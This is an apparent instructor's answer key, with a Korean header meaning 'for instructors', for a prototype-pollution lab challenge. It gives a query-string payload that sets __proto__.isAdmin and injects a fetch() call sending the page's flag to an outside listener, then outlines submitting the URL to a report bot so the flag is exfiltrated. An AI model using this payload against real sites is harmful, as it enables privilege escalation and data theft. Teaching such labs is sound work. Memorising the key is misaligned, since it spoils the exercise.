# [강사용] Prototype Pollution
`?c={"__proto__":{"isAdmin":true,"code":"fetch('http://host.docker.internal:8000?a='+flag.innerText)"}}` → report 내부 URL 제출 → 봇(내부)에서 flag 노출 → 전송.
